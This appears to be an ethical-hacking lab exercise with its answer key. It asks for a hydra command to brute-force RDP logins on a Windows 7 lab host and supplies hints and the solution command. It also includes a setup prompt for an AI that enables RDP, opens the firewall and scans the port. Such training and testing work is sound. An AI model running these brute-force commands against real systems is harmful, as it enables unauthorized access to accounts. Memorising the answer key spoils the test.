# Q063 — RDP Bruteforce Win7

| Field | Value |
|---|---|
| **Target** | `192.168.52.130` (Windows 7) |
| **Domain** | 05 — System Hacking |
| **Difficulty** | 🟡 Medium |
| **Tools** | `hydra` |
| **Time budget** | 15–25 min |

---

## 📝 Question

Use hydra to bruteforce RDP on Win7 with usernames `Administrator,user` and a small wordlist. Provide command.

---

## 🎯 Flag Format

```
cmd=<short>
```

Example: `cmd=hydra -L users.txt -P pass.txt rdp://192.168.52.130`

**⚠️ Format strict hai** — lowercase, no spaces around `=`, semicolon separator where shown.

---

## 💡 Hints

<details>
<summary>Hint 1 (click)</summary>

Module name in hydra: `rdp`.
</details>

<details>
<summary>Hint 2</summary>

Slow — RDP rate-limited.
</details>

---

## ✅ Solution

<details>
<summary>Show solution</summary>

```bash
hydra -L users.txt -P /usr/share/wordlists/fasttrack.txt rdp://192.168.52.130
```

Cracks lab Administrator password if weak.

**Answer:** `cmd=hydra -L users.txt -P pass.txt rdp://192.168.52.130`

📖 Ref: [tools/hydra.md](../../tools/hydra.md)
</details>

---

## 🤖 Claude Setup Prompt (for Claude-on-your-PC)

```
Pre-requisites for Q063:
1. Verify Win7 (192.168.52.130) up.
2. Enable RDP on Win7: System Properties → Remote tab → Allow connections. Windows Firewall allow Remote Desktop.
3. From Parrot: nmap -p 3389 192.168.52.130 — open.
4. On Parrot ensure hydra has RDP support (xfreerdp or libfreerdp): hydra -h 2>&1 | grep rdp.
5. Create small users.txt with 'Administrator' and 'user'.

Report back: "Lab ready for Q063 — RDP 3389 open on Win7, hydra rdp module ready".
```
